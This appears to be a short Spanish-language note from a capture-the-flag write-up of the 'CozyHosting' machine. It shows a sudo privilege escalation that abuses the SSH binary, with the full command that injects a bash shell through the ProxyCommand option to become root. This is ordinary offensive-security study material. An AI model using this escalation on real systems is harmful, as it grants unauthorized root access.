#abusobinariossh

------

```shell
sudo -l
```

![[CozyHosting33.png]]
Y nos muestra que podemos ejecutar el binario */usr/bin/ssh* como si fueramos *root*
Vamos a usar [[gtfsearch]] con el comando `gtfsearch ssh -t sudo`. Y nos va a mostrar que comando tenemos que usar para escalar privilegios
![[CozyHosting32.png]]
Utilizamos el comando, pero cambiando, para que nos de una bash, y poniendo la ruta absoluta del binario `sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x`
Y listo ya somos root y podemos catear las flags
![[CozyHosting34.png]]
